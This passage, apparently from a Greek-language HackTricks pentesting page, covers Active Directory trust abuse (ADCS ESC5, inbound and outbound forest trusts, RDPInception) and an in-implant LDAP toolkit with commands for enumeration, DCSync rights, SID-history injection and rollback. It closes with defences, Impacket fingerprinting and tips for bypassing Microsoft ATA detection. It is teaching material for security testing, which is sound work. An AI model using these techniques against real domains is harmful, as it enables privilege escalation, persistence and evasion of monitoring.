Περισσότερη ενημέρωση είναι διαθέσιμη στο [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

Η ευπάθεια ADCS ESC5 στοχεύει στον έλεγχο αντικειμένων Public Key Infrastructure (PKI), με σκοπό τη δημιουργία ενός certificate template που επιτρέπει authentication ως οποιοσδήποτε user μέσα στο forest. Καθώς τα PKI objects βρίσκονται στο Configuration NC, το compromise ενός writable child DC επιτρέπει την εκτέλεση ESC5 attacks.

Περισσότερες λεπτομέρειες υπάρχουν στο [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Σε scenarios χωρίς ADCS, ο attacker έχει τη δυνατότητα να εγκαταστήσει τα απαραίτητα components, όπως αναφέρεται στο [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) ή bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Σε αυτό το σενάριο, **το domain σας είναι trusted** από ένα εξωτερικό domain, παρέχοντάς σας **απροσδιόριστα δικαιώματα** πάνω σε αυτό. Θα χρειαστεί να βρείτε **ποιοι principals του domain σας έχουν ποια πρόσβαση στο εξωτερικό domain** και στη συνέχεια να προσπαθήσετε να το εκμεταλλευτείτε:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Εξωτερικό Forest Domain - Μονόδρομη (Εξερχόμενη)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Σε αυτό το σενάριο, **το domain σας** **εμπιστεύεται** ορισμένα **privileges** σε principal από **διαφορετικά domains**.

Ωστόσο, όταν ένα **domain είναι trusted** από το trusting domain, το trusted domain **δημιουργεί έναν user** με **predictable name**, ο οποίος χρησιμοποιεί ως **password το trusted password**. Αυτό σημαίνει ότι είναι δυνατό να **αποκτήσετε πρόσβαση σε έναν user από το trusting domain για να εισέλθετε στο trusted domain**, να το κάνετε enumerate και να προσπαθήσετε να κάνετε περαιτέρω privilege escalation:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος compromise του trusted domain είναι να βρείτε ένα [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που έχει δημιουργηθεί προς την **αντίθετη κατεύθυνση** από αυτήν του domain trust (κάτι που δεν είναι ιδιαίτερα συνηθισμένο).

Ένας άλλος τρόπος compromise του trusted domain είναι να περιμένετε σε ένα machine όπου **ένας user από το trusted domain μπορεί να αποκτήσει πρόσβαση**, ώστε να συνδεθεί μέσω **RDP**. Στη συνέχεια, ο attacker θα μπορούσε να κάνει code injection στη διεργασία του RDP session και να **αποκτήσει πρόσβαση στο origin domain του victim** από εκεί.\
Επιπλέον, αν το **victim είχε κάνει mount τον σκληρό του δίσκο**, ο attacker θα μπορούσε, από τη διεργασία του **RDP session**, να αποθηκεύσει **backdoors** στον **startup folder του σκληρού δίσκου**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigation για το domain trust abuse

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που αξιοποιούν το attribute SID history σε forest trusts μετριάζεται μέσω του SID Filtering, το οποίο είναι ενεργοποιημένο από προεπιλογή σε όλα τα inter-forest trusts. Αυτό βασίζεται στην υπόθεση ότι τα intra-forest trusts είναι ασφαλή, καθώς θεωρείται το forest, και όχι το domain, ως security boundary, σύμφωνα με τη θέση της Microsoft.
- Ωστόσο, υπάρχει μια επιφύλαξη: το SID filtering ενδέχεται να διαταράξει εφαρμογές και user access, με αποτέλεσμα να απενεργοποιείται περιστασιακά.

### **Selective Authentication:**

- Για inter-forest trusts, η χρήση του Selective Authentication διασφαλίζει ότι οι users από τα δύο forests δεν πραγματοποιούν authentication αυτόματα. Αντίθετα, απαιτούνται explicit permissions ώστε οι users να αποκτήσουν πρόσβαση σε domains και servers μέσα στο trusting domain ή forest.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την εκμετάλλευση του writable Configuration Naming Context (NC) ή από επιθέσεις στον trust account.

[**Περισσότερες πληροφορίες σχετικά με τα domain trusts στο ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse από On-Host Implants

Το [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) επανυλοποιεί LDAP primitives τύπου bloodyAD ως x64 Beacon Object Files, τα οποία εκτελούνται εξ ολοκλήρου μέσα σε ένα on-host implant (π.χ. Adaptix C2). Οι operators κάνουν compile το pack με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν το `ldap.axs` και στη συνέχεια καλούν το `ldap <subcommand>` από το beacon. Όλη η κίνηση χρησιμοποιεί το τρέχον logon security context μέσω LDAP (389) με signing/sealing ή LDAPS (636) με automatic certificate trust, επομένως δεν απαιτούνται socks proxies ή disk artifacts.<sup>[[4]](#references)</sup>

### LDAP enumeration από το implant

- Τα `get-users`, `get-computers`, `get-groups`, `get-usergroups` και `get-groupmembers` μετατρέπουν short names/OU paths σε πλήρη DNs και κάνουν dump τα αντίστοιχα objects.
- Τα `get-object`, `get-attribute` και `get-domaininfo` ανακτούν arbitrary attributes (συμπεριλαμβανομένων των security descriptors), καθώς και τα forest/domain metadata από το `rootDSE`.
- Τα `get-uac`, `get-spn`, `get-delegation` και `get-rbcd` εμφανίζουν roasting candidates, delegation settings και υπάρχοντες descriptors του [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) απευθείας από το LDAP.
- Τα `get-acl` και `get-writable --detailed` κάνουν parse το DACL για να εμφανίσουν trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes) και inheritance, παρέχοντας άμεσους στόχους για ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives για escalation & persistence

- Τα object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον operator να προετοιμάζει νέα principals ή machine accounts όπου υπάρχουν δικαιώματα OU. Τα `add-groupmember`, `set-password`, `add-attribute` και `set-attribute` κάνουν άμεσο hijack των targets μόλις εντοπιστούν δικαιώματα write-property.
- Εντολές που εστιάζουν στα ACL, όπως `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` και `add-dcsync`, μετατρέπουν τα WriteDACL/WriteOwner σε οποιοδήποτε AD object σε password resets, έλεγχο group membership ή DCSync replication privileges, χωρίς να αφήνουν artifacts από PowerShell/ADSI. Τα αντίστοιχα `remove-*` καθαρίζουν τα injected ACEs.

### Delegation, roasting και Kerberos abuse

- Τα `add-spn`/`set-spn` κάνουν άμεσα έναν compromised user Kerberoastable. Το `add-asreproastable` (UAC toggle) τον προετοιμάζει για AS-REP roasting χωρίς να αγγίζει το password.
- Τα delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) τροποποιούν τα `msDS-AllowedToDelegateTo`, UAC flags ή `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, ενεργοποιώντας constrained/unconstrained/RBCD attack paths και καταργώντας την ανάγκη για remote PowerShell ή RSAT.

### sidHistory injection, OU relocation και shaping του attack surface

- Το `add-sidhistory` εισάγει privileged SIDs στο SID history ενός controlled principal (δείτε [SID-History Injection](sid-history-injection.md)), παρέχοντας stealthy access inheritance πλήρως μέσω LDAP/LDAPS.
- Το `move-object` αλλάζει το DN/OU υπολογιστών ή χρηστών, επιτρέποντας στον attacker να μεταφέρει assets σε OUs όπου ήδη υπάρχουν delegated rights, πριν κάνει abuse των `set-password`, `add-groupmember` ή `add-spn`.
- Τα tightly scoped removal commands (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` κ.λπ.) επιτρέπουν γρήγορο rollback αφού ο operator συλλέξει credentials ή persistence, ελαχιστοποιώντας το telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Μερικές γενικές άμυνες

[**Μάθετε περισσότερα για την προστασία των credentials εδώ.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures για Credential Protection**

- **Περιορισμοί Domain Admins**: Συνιστάται οι Domain Admins να επιτρέπεται να κάνουν login μόνο σε Domain Controllers, αποφεύγοντας τη χρήση τους σε άλλους hosts.
- **Privileges των Service Accounts**: Οι υπηρεσίες δεν πρέπει να εκτελούνται με Domain Admin (DA) privileges, ώστε να διατηρείται η ασφάλεια.
- **Temporal Privilege Limitation**: Για tasks που απαιτούν DA privileges, η διάρκειά τους πρέπει να περιορίζεται. Αυτό μπορεί να επιτευχθεί με: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Κάντε audit στα Event IDs 2889/3074/3075 και στη συνέχεια επιβάλετε LDAP signing και LDAPS channel binding σε DCs/clients, ώστε να μπλοκάρονται οι LDAP MITM/relay attempts.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protocol-level fingerprinting δραστηριότητας Impacket

Αν θέλετε να εντοπίσετε κοινό AD tradecraft, **μη βασίζεστε μόνο σε artifacts που ελέγχει ο operator**, όπως renamed binaries, service names, temp batch files ή output paths. Καταγράψτε τη baseline συμπεριφορά με την οποία legitimate Windows clients δημιουργούν [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC και WMI traffic και, στη συνέχεια, αναζητήστε **implementation quirks** που παραμένουν ακόμη και αφού ο operator τροποποιήσει τα `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ή `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **High-confidence standalone candidates** (αφού τα επικυρώσετε έναντι της δικής σας baseline):
- Authenticated DCE/RPC με `auth_context_id = 79231 + ctx_id`
- DCE/RPC authentication padding γεμισμένο με `0xff`
- LDAP Kerberos binds που τοποθετούν ένα raw Kerberos `AP-REQ` απευθείας στο SPNEGO `mechToken`
- SMB2/3 negotiate requests με ASCII-looking τιμές `ClientGuid`
- WMI `IWbemLevel1Login::NTLMLogin` που χρησιμοποιεί το non-standard namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **Καλύτερα ως correlation/scoring features**:
- Sparse ή duplicated Kerberos etype lists, ασυνήθιστα/missing `PA-DATA` ή TGS-REQ etype ordering που διαφέρει από το native Windows
- NTLM Type 1 messages χωρίς version info ή Type 3 messages με null host names
- Raw NTLMSSP μεταφερόμενο σε DCE/RPC αντί για SPNEGO, missing DCE/RPC verification trailers ή SPNEGO/Kerberos OID mismatches
- Πολλά από αυτά τα traits από το ίδιο host/user/session/time window είναι πολύ ισχυρότερα από οποιοδήποτε μεμονωμένο weak field
- **Χρήση ως enrichment, όχι ως standalone alerts**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names και tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Αυτά αλλάζουν εύκολα από τους operators και χρησιμοποιούνται καλύτερα για να εξηγούν γιατί ένα cross-protocol cluster είναι ύποπτο
- **Operational notes**:
- Ορισμένα από αυτά τα signals απαιτούν decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ή service-side visibility
- Επικυρώστε τα έναντι Samba/Linux clients, appliances και legacy software πριν τα προωθήσετε σε alerts
- Προωθήστε τα detections από enrichment -> hunting -> alerting καθώς αυξάνεται η εμπιστοσύνη σας στη baseline

### **Implementing Deception Techniques**

- Η υλοποίηση deception περιλαμβάνει τη δημιουργία παγίδων, όπως decoy users ή computers, με features όπως passwords που δεν λήγουν ή έχουν σημανθεί ως Trusted for Delegation. Μια λεπτομερής προσέγγιση περιλαμβάνει τη δημιουργία users με συγκεκριμένα rights ή την προσθήκη τους σε high privilege groups.<sup>[[2]](#references)</sup>
- Ένα πρακτικό παράδειγμα είναι η χρήση εργαλείων όπως: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Περισσότερες πληροφορίες για το deploying deception techniques υπάρχουν στο [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Για User Objects**: Ύποπτες ενδείξεις περιλαμβάνουν atypical ObjectSID, infrequent logons, creation dates και low bad password counts.
- **Γενικοί δείκτες**: Η σύγκριση των attributes πιθανών decoy objects με εκείνα γνήσιων objects μπορεί να αποκαλύψει inconsistencies. Εργαλεία όπως το [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) μπορούν να βοηθήσουν στον εντοπισμό τέτοιων deceptions.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Η αποφυγή session enumeration σε Domain Controllers για την αποτροπή του ATA detection.
- **Ticket Impersonation**: Η χρήση **aes** keys για τη δημιουργία tickets βοηθά στην αποφυγή detection, καθώς δεν γίνεται downgrade σε NTLM.
- **DCSync Attacks**: Συνιστάται η εκτέλεση από non-Domain Controller για την αποφυγή του ATA detection, καθώς η απευθείας εκτέλεση από Domain Controller θα ενεργοποιήσει alerts.

## References

- [1] [A Guide to Attacking Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forging Trusts for Deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [From Domain Admin to Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [A journey into forgotten Null Session and MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalating from child domain's admins to enterprise admins in 5 minutes by abusing AD CS, a follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)

{{#include ../../banners/hacktricks-training.md}}
